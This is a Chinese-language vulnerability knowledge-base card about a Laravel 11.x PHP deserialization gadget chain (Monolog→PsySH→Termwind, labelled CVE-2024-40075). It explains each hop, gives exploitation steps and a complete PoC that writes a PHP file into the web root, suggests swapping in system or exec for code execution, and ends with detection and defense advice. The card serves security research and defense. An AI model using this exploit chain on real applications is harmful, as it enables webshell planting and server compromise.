---
id: web-php-deserialization-laravel11-monolog-termwind-file-write
title: Laravel 11.x 反序列化 POP 链（CVE-2024-40075）：Monolog GroupHandler→Psy Hoa Stream→Termwind Element→Styles::format 任意函数写 WebShell
type: scenario
domain: web
path: web/php/deserialization
technique: laravel11-monolog-termwind-pop-chain-file-write
tags:
- php
- deserialization
- pop-chain
- laravel
- monolog
- termwind
- psysh
- file-write
- webshell
cve:
- CVE-2024-40075
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: Laravel v11.x（原文标题标记）
verification:
  verified_by: verifier-V292
  verified_at: '2026-11-08T07:52:44+08:00'
  notes: 已对照全文与 7 张图逐跳核对：Handler::__destruct→close、GroupHandler::close 遍历 handlers、Stream::close 对 getStreamName() 做 md5、getStreamName 返回 _bucket[self::NAME]、Element::toString 调 styles->format、Styles::format 以 textModifiers 为可调用函数并传 content/styles/parentStyles，均与图 02-07 一致；EXP 与原文 base64 序列化串相符。CVE-2024-40075 编号按原文标题记录，KB cve 表未收录，未独立核实 CVE 归属。已注明前提：应用自身存在用户可控 unserialize 入口（原文手工加 /test 路由），Laravel 不会自动反序列化用户输入。dedup 结果 duplicate=1 是草稿与已入库同 id 卡自匹配，非真实重复；其余候选均为不同类链。affected_versions 保留原文标题的 Laravel v11.x 标记。
url: /docs/web/php/deserialization/web-php-deserialization-laravel11-monolog-termwind-file-write/
draft: false
kb_aliases:
- CVE-2024-40075
- Laravel v11.x 反序列化
- Monolog GroupHandler POP 链
- Psy Readline Hoa Stream getStreamName
- Termwind Styles format file_put_contents
- Laravel POP chain
---

## 一句话结论

Laravel 11.x 默认依赖可组成一条反序列化 POP 链（CVE-2024-40075）：应用若对用户输入 `unserialize()`，构造 `Monolog\Handler\GroupHandler` 使 `__destruct()` 调用 `close()`，遍历可控 `handlers` 调用 `Psy\Readline\Hoa\FileRead::close()`；其父类 `Stream::close()` 对 `getStreamName()` 返回的 `_bucket[0]` 做 `md5()` 触发 `Termwind\Components\Hr::__toString()`，再进入 `Styles::format()`，把可控的 `textModifiers` 当函数名调用，最终用 `file_put_contents` 在 `public/` 写入 `<?php phpinfo();?>` 等 WebShell。

## 原理

- **起点**：`Monolog\Handler\Handler` 是抽象类，`__destruct()` 中 `try { $this->close(); } catch (\Throwable $e) {}`。`GroupHandler` 继承并重载 `close()`：先 `parent::close()`，再 `foreach ($this->handlers as $handler) { $handler->close(); }`；`handlers` 属性在反序列化时可控，数组元素的对象方法会被逐个调用。
- **第二跳**：把 `handlers` 设为 `[new FileRead()]`（`Psy\Readline\Hoa\FileRead` 实现抽象类 `Stream`）。`Stream::close()` 取 `$streamName = $this->getStreamName()`，非空时执行 `md5($streamName)`；`getStreamName()` 返回 `$this->_bucket[self::NAME]`（`self::NAME` 为 0），若该值是对象，`md5()` 会触发其 `__toString()`。
- **第三跳**：把 `_bucket[0]` 设为 `Termwind\Components\Hr`（继承抽象类 `Element`）。`Element::__toString()` 调 `toString()`，后者在 `content` 非数组时返回 `$this->styles->format($this->content)`；`styles` 可设为 `Termwind\ValueObjects\Styles` 对象。
- **sink**：`Styles::format(string $content)` 中 `foreach ($this->textModifiers as $modifier) { $content = $modifier($content, $this->properties['styles'] ?? [], $this->properties['parentStyles'] ?? []); }`；`textModifiers`、`properties` 均来自反序列化属性。设 `textModifiers=["file_put_contents"]`、`properties=["styles"=>"<?php phpinfo();?>","parentStyles"=>0]`、Element 的 `content="testtesttest.php"`，即调用 `file_put_contents("testtesttest.php","<?php phpinfo();?>",0)`，在 `public/` 落盘 PHP 文件。
- **为什么成立**：链上所有跳转都由 PHP 魔术方法/对象字符串化/可调用属性自动触发，攻击者只需控制反序列化对象图；Laravel 11 的开发/默认依赖（monolog、psysh、termwind）提供了这些类。Laravel 框架本身并不自动反序列化用户输入，危害成立的前提是应用存在 `unserialize($_GET/$_POST/...)` 之类的 sink（原文为演示在路由中手动添加）。

## 触发条件

- 目标为 Laravel 11.x 应用，vendor 中存在 Monolog、PsySH（`psy/psysh`）、Termwind 对应类。
- 应用存在用户可控的 `unserialize()` 入口（如原文 `unserialize(base64_decode($request->input("data")))`），且未使用 `allowed_classes` 白名单或签名校验。
- `public/` 目录对 PHP 进程可写，Web 服务器会执行其中的 `.php` 文件（Laravel 默认 public 为 Web 根）。
- 无 `disable_functions` 禁止 `file_put_contents`，类自动加载可用（Composer autoload）。

## 利用步骤

1. 确认入口：应用对 base64/原始数据执行 `unserialize()`；确认 Laravel 版本与 vendor 类存在。
2. 按命名空间构造对象图：`GroupHandler.handlers=[FileRead]`、`FileRead._bucket=[Hr]`、`Hr.content="testtesttest.php"`、`Hr.styles=Styles`、`Styles.textModifiers=["file_put_contents"]`、`Styles.properties=["styles"=>"<?php phpinfo();?>","parentStyles"=>0]`。
3. `serialize($obj)` 后 base64 编码，作为 `data` 参数请求 `/test?data=<base64>`。
4. 反序列化在请求结束/对象销毁时触发 `__destruct` 链，`file_put_contents` 在 `public/testtesttest.php` 写入 PHP 代码。
5. 访问 `/testtesttest.php` 执行代码；把内容换成完整 WebShell 即可进一步控制。

## PoC

原文 exp（构造序列化对象）：

```php
<?php
namespace Termwind\ValueObjects{
    Class Styles{
        private array $textModifiers;
        private array $properties;
        public function __construct(){
            $this->textModifiers = ["file_put_contents"];
            $this->properties = ["styles"=>"<?php phpinfo();?>", "parentStyles"=>0];
        }
    }
}
namespace Termwind\Components{
    use Termwind\ValueObjects\Styles;
    abstract Class Element{
        protected string $content;
        protected Styles $styles;
        public function __construct(){
            $this->content = 'testtesttest.php';
            $this->styles = new Styles();
        }
    }
    Class Hr extends Element{}
}
namespace Psy\Readline\Hoa{
    use Termwind\Components\Hr;
    abstract Class Stream{
        protected $_bucket;
        public function __construct(){
            $this->_bucket = [new Hr()];
        }
    }
    Class FileRead extends Stream {}
}
namespace Monolog\Handler{
    use Psy\Readline\Hoa\FileRead;
    Class GroupHandler{
        protected array $handlers;
        public function __construct(){
            $this->handlers = [new FileRead()];
        }
    }
}
namespace {
    $obj = new Monolog\Handler\GroupHandler();
    echo base64_encode(serialize($obj));
}
?>
```

请求：

```
GET /test?data=<base64(serialize(obj))>
# 落盘 public/testtesttest.php
```

要点：protected 属性序列化名为 `\0*\0属性名`，private 为 `\0类名\0属性名`；`Styles` 的 `textModifiers` 决定被调用的函数，`properties['styles']` 是写入内容，`properties['parentStyles']` 作为第三个参数（flags）。

## 变体与关联

- **sink 替换**：`textModifiers` 可控意味着可调用任意 PHP 函数（`system`、`exec`、`call_user_func` 等）；若参数形状不匹配，也可用其他可调用类/方法构造。
- **文件写入变体**：`content` 为数组时 `Element::toString()` 会走 `InheritStyles` 分支，仍有可控点；`file_put_contents` 可换为 `copy`、`rename`、`unlink` 等。
- **同类 Laravel 链**：`web-php-deserialization-laravel-reverb-redis-unserialize` 走 Laravel Reverb/Redis 反序列化；本卡是 Monolog→PsySH→Termwind 的框架依赖链，触发点与类图不同。
- **版本差异**：Laravel 11 不同小版本/依赖版本中类名、属性可见性与 `format()` 签名可能变化；利用前需按目标 vendor 代码核对。

## 检测与防御

- 禁止对用户输入使用 `unserialize()`；改用 JSON/`json_decode` 等安全格式；必须反序列化时使用 `allowed_classes` 白名单并校验 HMAC 签名。
- 升级 Laravel 及 Monolog/PsySH/Termwind 依赖到修复版本；移除不需要的开发依赖（psysh 等不应出现在生产 vendor）。
- 限制 `public/` 写权限（Web 进程不应对 Web 根可写），禁用危险的 `file_put_contents`/`system` 等函数或使用 open_basedir。
- 监控 Web 根目录新增 `.php` 文件、请求参数中出现长 base64 序列化串（`Tzoy...`/`O:` 特征）及进程写文件行为。
